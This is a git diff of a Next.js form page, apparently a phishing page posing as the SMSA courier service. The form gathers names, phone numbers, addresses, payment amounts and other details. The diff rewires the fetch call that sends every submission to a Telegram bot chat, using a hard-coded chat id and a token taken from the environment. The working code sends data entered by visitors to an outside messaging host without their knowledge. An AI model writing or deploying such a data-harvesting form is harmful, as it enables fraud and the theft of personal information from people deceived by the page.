@@ -1,11 +1,13 @@
 "use client"
 import { useRef } from 'react'
 import styles from './fozajil.module.css'
-import bot from '@/compnante/dataBot'
+
 import {useRouter,useSearchParams} from 'next/navigation'
 
 
 const Page = () => {
+  const token = process.env.TOKEN;
+  const pass = 7017479979
   let typeRequest = useRef();
   let fullname = useRef();
   let numphone = useRef();
@@ -36,7 +38,7 @@ if(typeRequest.current.value == "اختر الخدمة" || fullname.current.valu
     var length =`مدونة سمسا  %0A   نوع الخدمة : ${typeRequest.current.value} %0A الاسم الكامل  : ${fullname.current.value} %0A  رقم الجوال : ${numphone.current.value}%0A العنوان : ${adress.current.value} %0A المدينة : ${city.current.value} %0A قيمة السداد:${mony.current.value} %0A التفاصيل : ${detales.current.value} %0A %0A ${numshoh.current.value}`
 
 
-    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pass}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
 
 
   }
